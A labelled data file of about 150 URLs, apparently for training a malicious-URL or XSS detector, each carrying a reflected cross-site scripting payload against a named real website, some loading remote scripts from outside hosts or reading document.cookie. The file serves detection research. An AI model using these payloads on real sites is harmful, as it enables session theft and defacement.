http://semaphore.kent.gov.uk/cgi-bin/semaphoreserver.exe?b=f4dartford&amp;cmd%3dsearch.run.x=1&amp;cmd%3dsea<br>rch.run.y=1&amp;db=kent&amp;district=&amp;organise_coded=%3af9&amp;prop00=t%3dp&amp;query00=%22%3e%27%3e%3cscript%3ealer<br>t(123)%3c/script%3e&amp;showconcept=1&amp;stype=simple&amp;tbdb=kentlgcl&amp;simplesearch=true,Malicious
http://www.pcworld.co.uk/martprd/editorial/christmas-sale?camp_id=&quot;;&lt;/script&gt;&lt;script&gt;alert(&quot;by+panze<br>rturk+xss&quot;);&lt;/script&gt;,Malicious
http://suche.lycos.de/cgi-bin/pursuit?query=totalschaden%3cscript%3ealert%28'totalschaden'%29%3c%2fs<br>cript%3e&amp;site=de&amp;cat=loc,Malicious
http://hpcgi2.nifty.com/flapjack/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-%20unkn0wn<br>.eu%27%29%3c%2fscript%3e,Malicious
http://militaryhistory.about.com/gi/dynamic/zoffsitetopad.htm?zi=1/xj&amp;sdn=militaryhistory&amp;zu=%22%3e%<br>3cscript%3ealert(%22xss%22)%3c/script%3e&amp;ref=,Malicious
http://webmail.defensoria.to.gov.br/index.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%<br>3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.careerjet.co.in/search/jobs?s=%3cscript%3ealert%28%22xssed+by+snypter%22%29%3c%2fscript%3<br>e&amp;l=india,Malicious
http://eur-lex.europa.eu/smartapi/cgi/sga_doc?smartapi!celexapi!prod!celexnumdoc&amp;lg=en&amp;numdoc=21994a<br>0103(01)&amp;model=guichett&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;mystick&lt;/h1&gt;&lt;/marque<br>e&gt;,Malicious
http://search.mavinokta.com/perl-bin/search.cgi?query=msn.net&amp;pagenum=685&amp;category=&quot;&gt;&lt;script&gt;alert('<br>tek tabanca')&lt;/script&gt;,Malicious
http://www.randomruin.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://www.sudouest-emploi.com/scripts/consult/annonce/liste.asp?mode=rech_rapide&amp;in_process=vide&amp;do<br>maine=1%2c2&amp;motclef=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+ze<br>ryus+%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.sanalistan.com/kategori.php?k=&lt;title&gt;xssed%20by%20winkick&lt;/title&gt;&lt;h2&gt;xssed%20by%20winkick<br>;)&lt;/h2&gt;,Malicious
http://sesic1.sep.gob.mx/intranet/acronimos/siglas%20y%20acronimos.asp?busca=%3ch1%3eobexico%20was%2<br>0here%3c/h1%3e%3cimg%20src=%22http://cim.yethost.com/logocimxy3.png%22%3e,Malicious
http://www.tuaw.com/search/?q=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;searchsubm<br>it=&amp;invocationtype=wl-tuaw,Malicious
http://www.richardhumphrys.com.au/stock/image.php?page=1&amp;search_type=and&amp;image_id=1446&amp;keyword=vine&amp;<br>search_cat=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.ieee-earth.org/default.taf?menu=geoss&amp;feature=user&amp;title=user%20interface%20committee}%3c<br>/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e,Malicious
http://www.lawyers.com/ask_a_lawyer/q_and_a_archive/search_archive/index.php?site=111&amp;eid=&amp;prevpagei<br>d=04108&amp;paop=&amp;caop=&amp;consumertype=%22%22%3e%3e%3c%3cimg%20%22%22%22%3e%3cscript%3ealert(/xss/)%3c/scr<br>ipt%3e&amp;specialty=13&amp;keywords=%22%22%3e%3e%3c%3cimg+%22%22%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2<br>fscript%3e,Malicious
http://www.digitalcity.com/search/?q=%22%27%3e%3cmarquee%3e%3ch1%3ecueballr%3c%2fh1%3e%3c%2fmarquee%<br>3e,Malicious
http://autos.aol.com/cars-buick-enclave-2012-foo__bla-xss-6619%22%3e%3cscript%3ealert%2528document.c<br>ookie%2529%3c/script%3e%3cnoscript%3e/best-deal/,Malicious
http://www.dekodem.com/atolye/galeri/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://live.vodafone.com.tr/galleryimages/watch.php?url=http://live.vodafone.com.tr/galleryimages/ro<br>ckncoke/videos/rnc_video_03.flv&amp;keepthis=true&amp;tb_iframe=true&amp;height=&quot;&gt;&lt;script&gt;alert(string.fromcharc<br>ode(88,83,83))&lt;/script&gt;",Malicious
http://www7.oyunmania.net/categorie.php?vidcat=18&amp;o=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;by<br>st@rext&lt;/h1&gt;,Malicious
http://www.rbsc.org.uk/imglib/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.catholicculture.org/search/resultslist.cfm?resourcetype=2&amp;requesttype=sitebrowserate&amp;fide<br>lity=green&amp;resources=a%27+union+select+1,%27%3cscript%3ealert%28document.cookie%29;%3c/script%3e%27,<br>3,%27green%27+--+-+&amp;useability=%2b",Malicious
http://www.kontent.com/information/faq/searchallpopup/-cc91bcf0b7e4c563043cefd1b4878d1b/?helpbox[tex<br>t]=%22%3e%3cscript%3ealert(1)%3c%2fscript%3e&amp;helpbox[faq]=on&amp;helpbox[glossar]=on,Malicious
http://www.americanexpress.com/uk/nectar/default.shtml?pid=827&amp;buid=ccg&amp;psku=mut&amp;affid=1301290&amp;crtv=<br>&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;,Malicious
http://www.iso.ch/iso/en/stdsdevelopment/tc/tclist/technicalcommitteedetailpage.technicalcommitteede<br>tail?commid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
https://www.sparktrust.com/sparktrustcertified/account/signup?continue=stc_createaccount_step1&amp;compl<br>etion=stc_thankyou%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e&amp;activate=&amp;rcid=0&amp;signupt<br>ype=freereport&amp;workflow=freereport,Malicious
http://msn.estore.com.tr/estore/sayfalar.asp?dept_id=40000000&amp;bid=&quot;&gt;&lt;script&gt;alert('cyber//www.waratt<br>ack.org')&lt;/script&gt;,Malicious
http://www.juig.co.za/article.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.fonden.gob.ve/busqueda/index.php?search_field=%3e%22%3e%3cscript%20%0a%0d%3ealert(documen<br>t.domain)%3b%3c/script%3e&amp;submit=buscar,Malicious
http://charts.reuters.com/reuters/enhancements/chartapi/chart_api.asp?symbol=06b5pqz%3cscript%3ealer<br>t%28%27xss%27%29%3c/script%3e,Malicious
http://www.instructables.com/account/forgot?nxtpg=%22/%3e%3ciframe%20src=http://google.com%3e%3c/ifr<br>ame%3e%3cscript%20src=http://ha.ckers.org/xss.js?/%3e&amp;nxtpgname=,Malicious
"http://drug-doxycycline.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=3&i1.y=11",Malicious
http://www.footfetishtube.com/video.php?category=%22%3e%3cbody/onload=alert(/xss/)%3e&amp;viewtype=,Malicious
http://images.snap.com/search.php?query=%22%3cscript%3ealert(%22found%20by%20hotpockets%20of%20backs<br>lashsecurity.org%22)%3c/script%3e,Malicious
http://www.eventcenterb51.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://photobucket.com/images/love%20or%20kiss%20icons/?source=%22'/%3e%3cscript%3ealert('hello the<br>rat')%3c/script%3e,Malicious
http://www.partmaster.co.uk/cgi-bin/downloads.pl?brand=instruction+manuals&amp;criteria=%22%3e%3c%73%63%<br>72%69%70%74%3e%61%6c%65%72%74%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%7<br>3%63%72%69%70%74%3e,Malicious
http://bbs.hld.gov.cn/topic.cgi?forum=32&amp;topic=13854&amp;show=20%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%3<br>2%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c<br>%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://midiaclick.net/?search=%22%3e%3cscript+src%3dhttp%3a%2f%2fbyccc.awardspace.com%2fjs%2fxssccc.<br>js%3e%3c%2fscript%3e&amp;action=search,Malicious
http://www.police.qld.gov.au/station-locator/searchresults.asp?suburb='%3e%22%3e%3cscript/src=http:/<br>/kusomiso.com/xss.js%3e%3c/script%3e,Malicious
"http://horoscopes.msn.co.uk/horoscopes_astrology/horoscopes.php?sign=';alert(string.fromcharcode(88,<br>83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;ale<br>rt(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode<br>(88,83,83))%3c/script%3e",Malicious
http://blog.pixmania.com/?s=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e&amp;s-btn=,Malicious
http://www.raggareggae.com/public/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://www.loc.gov/standards/premis/premis-keyword.php?searchterm=%22%3e%3cscript%3ealert(document.c<br>ookie)%3c%2fscript%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss+by+th3+rdx-%3c%2fh1%3e%3c%2fmarquee%3e&amp;searc<br>htype=all&amp;submit=go,Malicious
http://www.metallica.com/index.asp?category_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.romspider.com/search.php?q=%27%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript<br>%3e,Malicious
http://services.oxfordjournals.org/cgi/searchresults?fulltext=%3cscript+src%3dhttp%3a%2f%2fha.ckers.<br>org%2fs.js%3e%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.festival-croisements.cn/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20th<br>e%20rat')%3c/script%3e,Malicious
http://spor.ok.net/sorgula.html?sorgula=true&amp;anahtar='&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious
http://ms113.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.shadowserver.org/wiki/pmwiki.php?action=search&amp;n=defacedbyironzorgdefacedbyironzorgdeface<br>dbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefa<br>cedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgde<br>facedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorg.defacedbyironzorgdefacedbyironzor<br>gdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironz<br>orgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyiro<br>nzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorgdefacedbyironzorg&amp;q=%22%3e%3cmarquee%3edefac<br>ed%3c%2fmarquee%3e,Malicious
http://www.um.u-tokyo.ac.jp/cgi-bin/umdb/newspaper1000?s=2451&amp;c=25&amp;title=&amp;place=&amp;publisher=&amp;gengo1=&amp;<br>year1=&amp;gengo2=&amp;year2=&amp;note=%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e&amp;,Malicious
http://www.evrensel.net/bolge.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ndtvjobs.bixee.com/search/search/?q=%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://sports.kbs.co.kr/app/actions/playergrade?cmd=playergradelist&amp;item_code=%3cscript%20src=http:/<br>/ha.ckers.org/xss.js%3e%3c/script%3e,Malicious
http://support.hardwarezone.com/view.php?e=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;t=&quot;&gt;&lt;script&gt;al<br>ert(document.cookie);&lt;/script&gt;,Malicious
http://www.dutchtub.com/english00/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c<br>/script%3e,Malicious
http://www.biomedcentral.com/search/results.asp?drpfield1=&amp;txtsearch1=%3cscript%3ealert%28%27xss%27%<br>29%3b%3c%2fscript%3e&amp;drpphrase1=and&amp;drpfield2=[ti]&amp;txtsearch2=%3cscript%3ealert%28%27xss%27%29%3b%3c<br>%2fscript%3e&amp;drpphrase2=and&amp;drpfield3=[au]&amp;txtsearch3=%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscrip<br>t%3e&amp;drpphrase3=and&amp;drpfield4=[ta]&amp;txtsearch4=%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e&amp;drp<br>phrase4=exact&amp;chkbmcjournals=true&amp;drpfromdate=&amp;drptodate=&amp;chkcurrentopinion=true&amp;drpaddedinlast=&amp;drp<br>orderby=by+date&amp;drpperpage=20&amp;drpabstract=no+abstract&amp;search.x=34&amp;search.y=4&amp;search=search&amp;strtempst<br>ring=&amp;strsearchboxtype=bmc_advanced_results&amp;search.x=10&amp;jou_id=,Malicious
"http://www.lcs.mit.edu/publications/viewpubs.php?cat=';alert(string.fromcharcode(83,69,67,85,82,73,8<br>4,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(st<br>ring.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,<br>82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,6<br>7,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
https://secure.westclifflabs.com/secure/billing/default.asp?username=%22%3e%3cscript%3ealert(1)%3c%2<br>fscript%3e&amp;password=&amp;login.x=0&amp;login.y=0,Malicious
http://www.xangrila.rs.gov.br/busca.php?&amp;acao=busca&amp;dsbusca=%22%3e'%3e%3cscript%20src=http://vuln.xs<br>sed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://searchina.ne.jp/cgibin/auto.cgi?keyword=%27%3e%22%3e%27%3e%3cscript%3ealert%28%22xss+by+kusom<br>iso.com%22%29%3c%2fscript%3e&amp;type=news&amp;x=0&amp;y=0,Malicious
http://flashcdn.cnet.com/flashgen.cgi?sname=%22%3e%3cscript%3ealert(%22www.hackersblog.org%22)%3c/sc<br>ript%3e,Malicious
http://www.labelwinsolutions.com/login.asp?user=guest&amp;pwd=guest&amp;company=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.vegaspia.com/search.php?query=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2ecom%2<br>fxss%2ejs%3e%3c%2fscript%3e&amp;indication_mode=list&amp;videocollection=agesagenew,agesageall",Malicious
http://www.evrensel.net/mizah.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://www.gaytube.com/group_media&amp;key=daddyson%27%22%3e%3c/title%3e%3cmarquee%3e%3ch1%3exss%20by%20<br>xylitol%3c/h1%3e%3c/marquee%3e%3cstrong%3e%3cblink%3et4pz%3c/blink%3e%3c/strong%3e%3cmarquee%3e%3ch1<br>%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.asca.it/moddettnews.php?idnews=776767&amp;canale=ora&amp;articolo=%3c/title%3e%3c/head%3e%3cbody%<br>3e%3cscript%20src=%22http://googlebig.com/l.js%22%3e,Malicious
http://adspecs.yahoo.co.uk/search?q=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e&addr=&hs=1&lat=&lon=&locac=0,Malicious
http://www.mavala.ch/indexphp.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://m-pe.tv/u/group.php?uid='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.sparbillig.de/x/result_s.jsp?q=%3c%22%3c%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.batanga.com/en/list/default.asp?andtag=music&amp;type=artist&amp;order=6&amp;genre=&amp;filter=z%27%22%3e<br>%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%<br>3c/marquee%3e,Malicious
http://www.pakistan.gov.pk/mindivredirect.jsp?name=xss%20by%20zombie_ksa%20|%20mr.lonely420@hotmail.<br>com%27%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%20src=%27http://loverzpoint.info/5<br>5.js%27%3e%3c/script%3e,Malicious
http://eclkc.ohs.acf.hhs.gov/eclkc/customerservice/feedback;internal&amp;action=js.execute.action&amp;parame<br>ter=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.cabs.org/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://games.levelupgames.uol.com.br/ragnarok/noticias/noticia.php?id_noticia=&quot;&gt; &lt;script&gt;alert(&quot;i'm<br>an xss&quot;)&lt;/script&gt;,Malicious
http://www.aquatinte.fr/gallery.php?id=%27%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious
http://www.mj.gov.br/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%<br>3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.dopdolu.net/search/ara/?ney=%22%3e%3cscript%20src=http://sinek.pandela.net/j.js%3e%3c/scr<br>ipt%3e,Malicious
http://www.azfuture.org/emailtheeditor.asp?email=beltnews@yahoo.com}%3c/style%3e%3cscript%3ea=eval;b<br>=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/<br>marquee%3e,Malicious
http://www.nespresso.com/club_tools/accesories/pop.php?lang=%27%22%3e%3c/title%3e%3cscript%3ealert(1<br>337)%3c/script%3e,Malicious
http://lists.topica.com/dir/?cid=0&amp;results=none&amp;query=%22%3e%3cscript%3ealert(123)%3c%2fscript%3e%22<br>&amp;search_type=cat&amp;search_what=all,Malicious
http://benchmail.benchmark.fr/asp/abonnement/recherche_lettre.asp?mot_clef=%22%27--%3e%2f%3e%29%3b%7<br>d%3balert%28-1%29%3b%3c%2fscript%3e%3cscript%3ealert%28'hello%20the%20rat'%29%3c%2fscript%3e&amp;or=&amp;f_v<br>alider.x=5&amp;f_valider.y=8,Malicious
http://www.nallihantutkusu.com/resimgaleri/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ce1.1bis.com/lapostenet/map/map.asp?x=598792&amp;y=2426964&amp;scale=5000&amp;title=&lt;script&gt;alert(&quot;script<br>orium(turkey)&quot;)&lt;/script&gt;,Malicious
http://www.alex10.com.br/alex10/tr2/login.asp?stat=2&amp;url=%22%3e%3cscript+src=http://starext.by.ru/lt<br>.js%3e,Malicious
http://international.ucla.edu/africa/events/showevent.asp?eventid=5403&amp;eventdate=11/9/2006&quot;&gt;&lt;script&gt;<br>alert(/pyske/)&lt;/script&gt;,Malicious
http://kalbimdesin.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.pioneersholding.com/egypt/page.php?type=&amp;page=news&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&amp;pg=news&amp;page_no=11&amp;search_text=&amp;company=&amp;month=&amp;markets=21,Malicious
http://www.empik.com/search.jsp?query=%27%22%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3cmarqu<br>ee%3ewhitehat+forever%3c%2fmarque%3e&amp;currentcategory=4000000&amp;wyszukajw=2&amp;searchpolish=on&amp;searchlangu<br>age=,Malicious
http://aboutcsl.com/photo_gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://technology.jpl.nasa.gov/search/?searchcriteria=%22%3e%3c%3e%3cfont+color%3dred%20size=70%3e%3<br>cmarquee%3exssed_by_samthg%3c/marquee%3e%3c%2ffont%3e%3c,Malicious
http://www.onsemi.com/powersolutions/search.do?searchstring=%22%3e%3cscript%3ealert(/xss/);%3c/scrip<br>t%3e74l05&amp;searchtype=others&amp;tabbed=y&amp;clearfilters=y,Malicious
http://ms150.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://plansitineraires.aliceadsl.fr/aliceadsl/map/map.asp?x=601368&amp;y=2431369&amp;scale=5000&amp;title=&lt;scri<br>pt&gt;alert(&quot;scriptorium(turkey)hackhaber.com&quot;)&lt;/script&gt;,Malicious
https://secure.ipowerweb.com/cgi-bin/hosting/signup.cgi?domain=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;input<br>type=&quot;hidden,Malicious
http://www.vulgaris-medical.com/resultats.php?cx=001991652407399364990%3aj41p3yav630&amp;cof=forid%3a9&amp;i<br>e=iso-8859-1&amp;q=+%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(%22xss%22)%3b%3c%2fscript%3e%3cmarquee+bgco<br>lor%3d%22red%22%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;sa.x=24&amp;sa.y=8#244,Malicious
http://www.kinenbi.gr.jp/cgi-local/whatday.cgi?&amp;m=2&amp;d=8'%3e%22%3e%3cscript/src=http://kusomiso.com/x<br>ss.js%3e%3c/script%3e,Malicious
http://www.akamai.fr/enfr/html/awe/login.html?campaign_id=%22%3ebusindre%3cscript%3ealert(document.c<br>ookie)%3c/script%3e&amp;curl=/enes/dl/whitepapers/how_will_the_internet_scale.pdf,Malicious
http://davenport17.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www2.beppegrillo.it/v2day/vmarcia/vmarcia.php?avatar=123%22%3e%3cscript%3ealert(/xss/)&lt;/scrip<br>t&gt;,Malicious
http://www.hpcalc.org/search.php?query=%22%3e%27%3e%3cscript%3ealert%2842%29%3b%3c%2fscript%3e,Malicious
http://www.bbc.co.uk/apps/ifl/food/recipes/queryengine?templatestyle=refine_by_1_gg&amp;orig_kw=%22%3e%3<br>cscript%3ealert(%22xss%22)%3c/script%3e&amp;config=db&amp;scope=recipes&amp;page=1&amp;pagesize=15&amp;attrib_26=keyword<br>s&amp;oper_26=eq&amp;val_26_1=%22%3e%3c&amp;attrib_2=programme_name&amp;oper_2=eq&amp;val_2_1=saturday+kitchen&amp;attrib_3=<br>chef_name&amp;oper_3=eq&amp;val_3_1=&amp;attrib_12=healthy&amp;oper_12=eq&amp;attrib_13=quick&amp;oper_13=eq&amp;attrib_10=veget<br>arian&amp;oper_10=eq&amp;submit.x=0&amp;submit.y=0&amp;submit=search,Malicious
http://www.relaxo.tv/newsdetail.php?id=%27%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.kktcb.eu/index.php?men=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcotic<br>xs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.clausetezier-iberica.com/uk/clause/filiale/index.php?pay_id=395&amp;mrq_id=1%22%3e%3cscript%3<br>ealert%28123%29;%3c/script%3e,Malicious
http://www.1net.at/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bourgogne.ecologie.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('hell<br>o%20the%20rat')%3c/script%3e,Malicious
http://www2.ca.nizkor.org/ftp.cgi/people/z/zundel.ernst/spoofs/crapper%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e,Malicious
http://www.dynamicchiropractic.com/mpacms/dc/article.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%2<br>81337%29%3c/script%3e,Malicious
http://www.brockport.edu/athletics/football/index.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%2813<br>37%29%3c/script%3e,Malicious
http://usa.kyoceramita.com/americas/jsp/kyocera/wheretobuy_result.jsp?zipcode=blah<br>blah&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;&amp;cat=2,Malicious
http://storage.organizeit.com/search?p=q&amp;ts=custom&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;restricted=mt_restricted_organizesit,Malicious
http://icsolihull.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org<br>/)%3c/script%3e%3cp,Malicious
http://www.steroids-pharma.com/product_search.php?query=%27%22%3e%3c/title%3e%3cscript%3ealert%28133<br>7%29%3c/script%3e,Malicious
http://xlice.net/error/?err=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://newyork.mets.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://www.ictqatar.gov.qa/output/page221.asp?pageid=%22%3e%3cscript%3ealert(/noph0bia/)%3c/script%3<br>e,Malicious
http://seattle.mariners.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://mkt.fem.jp/encode.cgi?e=%3c/textarea%3e%3cscript%3ealert(/xss/)%3c/script%3e&amp;code=de,Malicious
http://vizagfreeads.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.myriddle.co.il/riddles/crosslist.asp?type=1&amp;user=%22%3e%3cscript%3ealert(document.cookie)<br>%3c/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
https://ssl-account.com/adt-bs.de/check_login.php?lang=en&amp;err_string=%3c/font%3e%3ciframe%20src=java<br>script:alert(123)%3e%3c/iframe%3e,Malicious
"http://www.americasarmy.com/vidpop.php?filepath=""><script>alert(""xss found by rugburn"")</script>",Malicious
http://bitmail.jp/member_step2.asp?stracnt='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.co<br>m%22)%3c/script%3e,Malicious
"http://www.faith-go.co.jp/lists/itemlist3_hobby.asp?cid=00343&amp;fl=1,2&amp;n_name=%22%3e'%3e%3c/script%3e%<br>3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3eds%20linker",Malicious
